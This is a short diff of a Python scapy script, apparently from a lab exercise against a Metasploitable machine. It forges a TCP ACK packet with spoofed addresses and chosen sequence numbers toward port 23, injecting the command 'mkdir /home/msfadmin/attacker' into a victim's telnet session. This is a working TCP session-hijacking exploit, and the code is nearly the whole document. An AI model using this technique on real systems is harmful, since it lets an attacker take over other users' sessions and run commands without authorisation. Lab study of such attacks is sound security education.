@@ -2,8 +2,8 @@
 import sys
 from scapy.all import *
 
-IPLayer = IP (src="10.10.10.195", dst = "10.10.10.193")
-TCPLayer = TCP (sport=44902, dport=23, flags="A", seq=3696326137, ack=3918646930)
+IPLayer = IP (src="10.10.10.194", dst = "10.10.10.195")
+TCPLayer = TCP (sport=60520, dport=23, flags="A", seq=2830774205, ack=3891207049)
 
 data = "\n mkdir /home/msfadmin/attacker \n"
 
